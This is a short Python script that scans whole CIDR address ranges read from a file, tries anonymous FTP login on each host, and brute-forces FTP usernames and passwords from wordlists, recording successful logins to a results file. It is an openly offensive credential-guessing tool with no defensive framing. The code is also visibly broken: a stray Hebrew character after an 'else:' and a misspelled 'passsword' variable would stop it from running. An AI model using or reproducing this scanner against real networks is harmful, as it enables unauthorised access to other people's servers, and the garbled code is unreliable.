from ftplib import FTP
import logging
import threading
import time
import ipaddress



def recover_creds(addr):
	f= open("results.txt","a+")
	try:
		print("Try to connect to: {}, anonymously".format(addr))
		ftp = FTP(addr, timeout=3)

	except:
		print("connection to {} failed!".format(addr))
	else:
		print("connection to {} successed!".format(addr))
		f.write("connection to {} anonymously successed!".format(addr))

	
	print("Try to connect to: {}, with username and password".format(addr))
	with open("A-List-Users.txt") as file:
		for user in file:
			user = user.strip() 
			#print user
			with open("A-List-passwords.txt") as file2:
				for password in file2:
					#print ("user:{}, password:{}".format(user, password))
					try:
						ftp = FTP(addr,user,password, timeout=3)

					except:
						print("connection to {} with user: {} and password: {} failed!".format(addr, user, password))
					else:ש
						print("connection to {} with user: {} and password: {} successed!".format(addr, user, passsword))							
						f.write("connection to {} with user: {} and password: {} successed!".format(addr, user, passsword))

if __name__ == "__main__":
	format = "%(asctime)s: %(message)s"
	logging.basicConfig(format=format, level=logging.INFO,
                        datefmt="%H:%M:%S")
	with open("cider.txt") as file:
		for line in file:
			line = line.strip() 
			addrs = ipaddress.ip_network(line)
			for addr in addrs:
				print(addr)
				logging.info("Main    : before creating thread")
				x = threading.Thread(target=recover_creds, args=(addr,))
				logging.info("Main    : before running thread")
				x.start()
				logging.info("Main    : wait for the thread to finish")
				x.join()
	logging.info("Main    : all done")
	
